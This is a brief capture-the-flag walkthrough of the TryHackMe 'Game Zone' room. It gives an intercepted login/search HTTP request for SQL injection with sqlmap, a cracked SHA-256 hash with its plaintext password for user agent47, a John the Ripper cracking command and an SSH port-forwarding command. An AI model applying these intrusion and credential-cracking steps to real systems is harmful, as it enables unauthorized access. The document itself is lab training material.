# GameZone_tryhackme
gamezone tryhackme understanding sqlmap,hashcracking,ssh tunnel and priviledge escalation
![](login_page.png)


POST /portal.php HTTP/1.1
Host: 10.10.116.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.116.228/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close
Cookie: PHPSESSID=94hrt1bh289hbfc25js3aqkvb0
Upgrade-Insecure-Requests: 1

searchitem=test


![](sqlmap_details.png)


![](user_txt_agent47.png)


## agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
## hash cracking password found:videogamer124
### command john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256

![](checking_sockets.png)
## ssh tunneling command
# ssh -L 10000:localhost:10000 agent47@10.10.73.54

![](ssh_tunneling_result.png)
